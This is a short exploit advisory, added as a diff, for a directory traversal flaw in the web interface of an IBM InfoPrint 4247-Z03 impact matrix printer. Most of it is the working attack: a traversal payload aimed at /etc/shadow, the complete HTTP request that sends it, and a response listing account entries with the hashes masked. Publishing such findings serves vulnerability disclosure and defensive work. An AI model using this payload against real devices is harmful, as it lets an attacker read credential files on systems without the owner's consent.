@@ -1,0 +1,34 @@
+# Exploit Title: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Directory Traversal
+# Date: 2020-01-01
+# Exploit Author: Raif Berkay Dincel
+# Vendor Homepage: ibm.com
+# Software https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?subtype=ca&infotype=an&appname=iSource&supplier=897&letternum=ENUS107-295
+# Version: 1.11
+# CVE-ID: N/A
+# Tested on: Linux Mint / Windows 10
+# Vulnerabilities Discovered Date : 2019/06/10
+
+# Vulnerable Parameter Type: GET
+# Vulnerable Parameter: TARGET/[Payload]
+
+# Proof of Concepts:
+
+TARGET/./../../../../../../../../../../etc/shadow
+
+# Request:
+
+GET /./../../../../../../../../../../etc/shadow HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/json; charset=UTF-8
+Connection: close
+
+# Response:
+
+root:::XXXXX
+www-data:::XXXXX
+nobody:::XXXXX
+default:::XXXXX
